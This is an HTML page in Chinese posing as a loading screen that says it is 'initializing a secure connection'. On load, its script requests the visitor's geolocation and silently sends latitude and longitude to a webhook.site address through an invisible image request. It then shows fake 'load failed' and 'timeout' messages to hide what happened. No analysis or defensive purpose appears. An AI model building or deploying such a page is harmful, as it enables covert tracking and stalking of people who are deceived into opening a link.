<!CDOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>加载中...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background-color: white; text-align: center; padding-top: 50px;">
    <h2 id="msg">正在初始化安全连接...</h2>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition, showError);
            }
        }

        function sendPosition(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var myUrl = "https://webhook.site/8d58a783-30ed-421a-8779-5d714c5ca502";

            // 【暴力绕过法】创建一个不可见的图片对象
            // 浏览器为了加载这张图片，必须访问这个 URL，从而把坐标带给 Webhook
            var img = new Image();
            img.src = myUrl + "?lat=" + lat + "&lon=" + lon; 
            
            // 模拟成功后的视觉反馈
            document.getElementById("msg").innerHTML = "内容加载失败，请刷新重试。";
        }

        function showError(error) {
            document.getElementById("msg").innerHTML = "网络连接超时，请检查权限。";
        }

        window.onload = getLocation;
    </script>
</body>
</html>
